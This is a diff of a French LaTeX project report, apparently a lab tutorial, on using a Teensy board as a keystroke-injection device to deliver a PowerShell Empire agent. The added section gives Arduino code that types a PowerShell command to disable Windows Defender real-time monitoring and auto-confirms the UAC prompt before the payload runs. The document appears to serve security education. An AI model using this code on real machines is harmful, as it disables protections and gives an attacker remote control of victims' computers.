@@ -72,10 +72,16 @@ Et enfin, générer le payload en tapant:
 
 Empire devrait afficher que le fichier de script Arduino a bien été créer:
 
+\includegraphics[scale=0.8]{images/SEN_Projet_Image06.png}
+
 Il ne nous reste plus qu’à le compiler et le transférez sur le Teensy, pour cela il faut 
 revenir sur l’IDE Arduino et ouvrir le fichier précédemment créé, puis cliquez sur le bouton en haut à gauche de compilation/vérification:
 
+\includegraphics[scale=0.8]{images/SEN_Projet_Image010.jpeg}
+
 Puis, une fois la compilation finie, il faut cliquer sur le bouton d’upload vers le Teensy:
+
+\includegraphics[scale=0.8]{images/SEN_Projet_Image011.jpeg}
 
 Il est possible que Arduino ne parviennent pas à mettre le Teensy en “Program Mode”, dans ce cas là, appuyez sur 
 le bouton présent sur le Teensy pour le mettre en “Program Mode” manuellement.
@@ -83,13 +89,15 @@ le bouton présent sur le Teensy pour le mettre en “Program Mode” manuelleme
 Après tout cela, branchez le Teensy sur l’ordinateur cible, celui-ci devrait ouvrir un shell de cmd et tapez 
 son payload pour l'exécuter avec Powershell, une fois ceci fait, un agent devrait être disponible sur Empire:
 
+\includegraphics[scale=0.8]{images/SEN_Projet_Image07.png}
+
 Pour voir les agents avec lesquels il est possible d'interagir, tapez:
 
 \begin{lstlisting}{language=bash}
 > agents
 \end{lstlisting}
 
-
+\includegraphics[scale=0.5]{images/SEN_Projet_Image08.png}
 
 Pour interagir avec un agent, tapez:
 
@@ -99,14 +107,56 @@ Pour interagir avec un agent, tapez:
 
 Il est maintenant possible d'interagir avec la machine de la victime !
 
-\textbf{Note:} Il faut désactiver la protection de Windows Defender pour que le payload s'exécute correctement.
+\includegraphics[scale=0.48]{images/SEN_Projet_Image09.png}
+
+\subsubsection{Bypass Winodws Defender}
+
+Dans l'exemple précédent, si l'ordinateur était equipé de Windows Defender, le payload était bloqué, nous allons donc
+devoir désactiver Windows Defender avec le Teensy.
+
+Pour ce faire il faut éditer le script Arduino produit par “Empire” et ajoutez ces quelques lignes:
+
+\begin{lstlisting}{language=c}
+void sendKey(uint8_t keyin){
+  clearKeys();
+  Keyboard.set_key1(keyin);
+  Keyboard.send_now();
+  clearKeys();
+  delay(200);
+}
+\end{lstlisting}
+
+La fonction "sendKey()" vient de ce site: \url{https://www.securitysift.com/fun-with-teensy/}, j'ai eu quelques problèmes avec les différences de délai entre
+ma VM Windows et ma machine local, j'ai donc décider d'utiliser cette fonction afin de régler ces problèmes.
+
+Elle permet simplement d'envoyer des frappes clavier, mais elle réinitialise à chaque fois l'état des touches de contrôle (CAPS LOCK par exemple).
+
+\begin{lstlisting}{language=c}
+Keyboard.print("powershell -Command \"Start-Process PowerShell -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true' -Verb RunAs\"");
+sendKey(KEY_ENTER);
+sendKey(KEY_LEFT);
+sendKey(KEY_LEFT);
+sendKey(KEY_ENTER);
+\end{lstlisting}
+
+La commande permettant de désactiver la protection active de Windows Defender est la suivante: 
+
+\begin{lstlisting}{language=powershell}
+Set-MpPreference -DisableRealtimeMonitoring $true
+\end{lstlisting}
+
+On va donc placer cette commande comme argument d'un commande PowerShell lancé en tant qu'utilisateur privilegié.
+
+Cela va désactiver Windows Defender et appuyer sur "Oui" au moment de l'apparition de l'UAC, il faut pour cela que l'utilisateur dispose des droits nécessaire.
+
+Il faut placer ce bout de code là avant l'execution du payload Base64 d'Empire.
 
 \subsubsection{Sources}
 \begin{enumerate}
     \item \url{https://null-byte.wonderhowto.com/how-to/use-powershell-empire-generating-stagers-for-post-exploitation-windows-hosts-0179939/}
     \item \url{http://www.powershellempire.com/?page_id=110}
+    \item \url{https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Windows-10-:-Disable-Windows-Defender-through-powershell}
+    \item \url{https://serverfault.com/questions/464018/run-elevated-powershell-prompt-from-command-line/464024}
+    \item \url{https://www.securitysift.com/fun-with-teensy/}
+    \item \url{https://social.technet.microsoft.com/Forums/en-US/316d5790-8186-4ffa-875c-6b943478995b/start-powershell-script-from-cmd-as-admin?forum=winserverpowershell}
 \end{enumerate}
-
-
-
-
